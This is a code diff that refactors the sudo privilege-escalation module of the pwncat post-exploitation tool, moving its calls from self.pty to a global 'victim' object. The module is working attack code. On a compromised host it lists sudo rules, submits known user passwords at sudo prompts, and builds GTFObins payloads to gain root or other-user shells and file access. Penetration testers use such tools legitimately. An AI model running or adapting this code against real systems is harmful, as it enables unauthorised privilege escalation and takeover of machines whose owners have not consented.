@@ -1,35 +1,27 @@
 #!/usr/bin/env python3
-from typing import Generator, List, BinaryIO
-import shlex
-import sys
-import time
-import os
-from colorama import Fore, Style
-import socket
-from io import StringIO, BytesIO
 import functools
-import time
+from io import StringIO
+from typing import List
 
-from pwncat.util import CTRL_C
-from pwncat.privesc.base import Method, PrivescError, Technique
+from colorama import Fore, Style
+
+import pwncat
 from pwncat.file import RemoteBinaryPipe
+from pwncat.gtfobins import Capability, Stream
+from pwncat.privesc import BaseMethod, PrivescError, Technique
 from pwncat.pysudoers import Sudoers
-from pwncat.gtfobins import Capability, Stream, Binary, SudoNotPossible
-from pwncat import util
+from pwncat.util import CTRL_C
 
 
-class SudoMethod(Method):
+class Method(BaseMethod):
 
     name = "sudo"
     BINARIES = ["sudo"]
 
-    def __init__(self, pty: "pwncat.pty.PtyHandler"):
-        super(SudoMethod, self).__init__(pty)
-
     def send_password(self, current_user: "pwncat.db.User"):
 
         # peak the output
-        output = self.pty.peek_output(some=False).lower()
+        output = pwncat.victim.peek_output(some=False).lower()
 
         if (
             b"[sudo]" in output
@@ -37,7 +29,7 @@ class SudoMethod(Method):
             or output.endswith(b"password: ")
         ):
             if current_user.password is None:
-                self.pty.client.send(CTRL_C)  # break out of password prompt
+                pwncat.victim.client.send(CTRL_C)  # break out of password prompt
                 raise PrivescError(
                     f"user {Fore.GREEN}{current_user.name}{Fore.RESET} has no known password"
                 )
@@ -45,17 +37,17 @@ class SudoMethod(Method):
             return  # it did not ask for a password, continue as usual
 
         # Flush any waiting output
-        self.pty.flush_output()
+        pwncat.victim.flush_output()
 
         # Reset the timeout to allow for sudo to pause
-        old_timeout = self.pty.client.gettimeout()
-        self.pty.client.settimeout(5)
-        self.pty.client.send(current_user.password.encode("utf-8") + b"\n")
+        old_timeout = pwncat.victim.client.gettimeout()
+        pwncat.victim.client.settimeout(5)
+        pwncat.victim.client.send(current_user.password.encode("utf-8") + b"\n")
 
-        output = self.pty.peek_output(some=True)
+        output = pwncat.victim.peek_output(some=True)
 
         # Reset the timeout to the originl value
-        self.pty.client.settimeout(old_timeout)
+        pwncat.victim.client.settimeout(old_timeout)
 
         if (
             b"[sudo]" in output
@@ -63,10 +55,10 @@ class SudoMethod(Method):
             or b"sorry, " in output
             or b"sudo: " in output
         ):
-            self.pty.client.send(CTRL_C)  # break out of password prompt
+            pwncat.victim.client.send(CTRL_C)  # break out of password prompt
 
             # Flush all the output
-            self.pty.recvuntil(b"\n")
+            pwncat.victim.recvuntil(b"\n")
             raise PrivescError(
                 f"user {Fore.GREEN}{current_user.name}{Fore.RESET} could not sudo"
             )
@@ -75,19 +67,19 @@ class SudoMethod(Method):
 
     def find_sudo(self):
 
-        current_user = self.pty.current_user
+        current_user = pwncat.victim.current_user
 
         # Process the prompt but it will not wait for the end of the output
-        # delim = self.pty.process("sudo -l", delim=True)
+        # delim = pwncat.victim.process("sudo -l", delim=True)
         sdelim, edelim = [
             x.encode("utf-8")
-            for x in self.pty.process("sudo -p 'Password: ' -l", delim=True)
+            for x in pwncat.victim.process("sudo -p 'Password: ' -l", delim=True)
         ]
 
         self.send_password(current_user)
 
         # Get the sudo -l output
-        output = self.pty.recvuntil(edelim).split(edelim)[0].strip()
+        output = pwncat.victim.recvuntil(edelim).split(edelim)[0].strip()
         sudo_output_lines = output.split(b"\n")
 
         # Determine the starting line of the valuable sudo input
@@ -165,7 +157,7 @@ class SudoMethod(Method):
                         }
                     )
 
-        current_user = self.pty.current_user
+        current_user = pwncat.victim.current_user
 
         techniques = []
         for sudo_privesc in [*sudo_no_password, *sudo_all_users, *sudo_other_commands]:
@@ -179,7 +171,7 @@ class SudoMethod(Method):
             if "ALL" in users:
                 users = ["root"]
 
-            for method in self.pty.gtfo.iter_sudo(
+            for method in pwncat.victim.gtfo.iter_sudo(
                 sudo_privesc["command"], caps=capability
             ):
                 for user in users:
@@ -192,33 +184,33 @@ class SudoMethod(Method):
                         )
                     )
 
-        self.pty.flush_output()
+        pwncat.victim.flush_output()
 
         return techniques
 
     def execute(self, technique: Technique):
         """ Run the specified technique """
 
-        current_user = self.pty.current_user
+        current_user = pwncat.victim.current_user
 
         # Extract the GTFObins method
         method, sudo_spec, need_password = technique.ident
 
         # Build the payload, input data, and exit command
         payload, input_data, exit_command = method.build(
-            user=technique.user, shell=self.pty.shell, spec=sudo_spec
+            user=technique.user, shell=pwncat.victim.shell, spec=sudo_spec
         )
 
         # Run the commands
-        # self.pty.process(payload, delim=True)
-        self.pty.run(payload, wait=False)
+        # pwncat.victim.process(payload, delim=True)
+        pwncat.victim.run(payload, wait=False)
 
         # This will check if the password is needed, and attempt to send it or
         # fail, and return
         self.send_password(current_user)
 
         # Provide stdin if needed
-        self.pty.client.send(input_data.encode("utf-8"))
+        pwncat.victim.client.send(input_data.encode("utf-8"))
 
         return exit_command
 
@@ -236,16 +228,16 @@ class SudoMethod(Method):
             mode += "b"
 
         # Send the command and open a pipe
-        pipe = self.pty.subprocess(
+        pipe = pwncat.victim.subprocess(
             payload,
             mode,
-            data=functools.partial(self.send_password, self.pty.current_user),
+            data=functools.partial(self.send_password, pwncat.victim.current_user),
             exit_cmd=exit_command.encode("utf-8"),
         )
 
         # Send the input data required to initiate the transfer
         if len(input_data) > 0:
-            self.pty.client.send(input_data.encode("utf-8"))
+            pwncat.victim.client.send(input_data.encode("utf-8"))
 
         return method.wrap_stream(pipe)
 
@@ -265,10 +257,10 @@ class SudoMethod(Method):
             mode += "b"
 
         # Send the command and open a pipe
-        pipe = self.pty.subprocess(
+        pipe = pwncat.victim.subprocess(
             payload,
             mode,
-            data=functools.partial(self.send_password, self.pty.current_user),
+            data=functools.partial(self.send_password, pwncat.victim.current_user),
             exit_cmd=exit_command.encode("utf-8"),
         )
 
